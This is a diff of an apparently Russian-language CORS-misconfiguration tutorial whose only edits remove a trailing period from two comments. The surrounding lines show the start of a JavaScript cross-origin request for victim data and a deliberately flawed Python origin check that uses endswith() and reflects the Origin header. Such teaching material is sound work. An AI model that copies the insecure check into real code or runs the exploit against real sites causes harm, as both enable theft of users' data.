@@ -140,7 +140,7 @@ true`. Тогда скрипт на чужой странице шлёт зап�
 `/api/me` из введения давал все три условия сразу.
 
 ```javascript
-// УЯЗВИМО — демонстрация приёма, не для продакшена.
+// УЯЗВИМО — демонстрация приёма, не для продакшена
 const url = "https://vulnerable-website.com/sensitive-victim-data";
 const req = new XMLHttpRequest();
 req.open("get", url, true);
@@ -194,7 +194,7 @@ origin.
 задаёт три вопроса подряд. Строка, впустившая `notexample.com`, выглядит так.
 
 ```python
-# УЯЗВИМО — демонстрация, не для продакшена.
+# УЯЗВИМО — демонстрация, не для продакшена
 origin = request.headers.get("Origin", "")
 if origin.endswith("example.com"):                       # (1)
     resp.headers["Access-Control-Allow-Origin"] = origin  # (2)
